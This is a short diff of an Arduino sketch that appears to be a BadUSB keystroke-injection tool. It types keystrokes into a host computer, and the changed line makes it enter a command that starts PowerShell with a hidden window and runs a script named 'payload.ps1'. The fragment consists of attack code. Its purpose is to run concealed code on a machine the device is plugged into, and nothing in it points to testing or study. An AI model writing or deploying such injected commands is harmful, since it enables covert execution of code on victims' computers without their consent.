@@ -27,7 +27,7 @@ void setup(){
   String text_en = fr2en(text);
   Keyboard.print(text_en + "\n");
   delay(1000);
-  String var_text = "PowerShell.exe -windowstyle hidden {powershell -noexit coucou.ps1}";
+  String var_text = "PowerShell.exe -windowstyle hidden {powershell -noexit payload.ps1}";
   String text_fr = fr2en(var_text);
   Keyboard.print(text_fr + "\n");
   Keyboard.releaseAll();
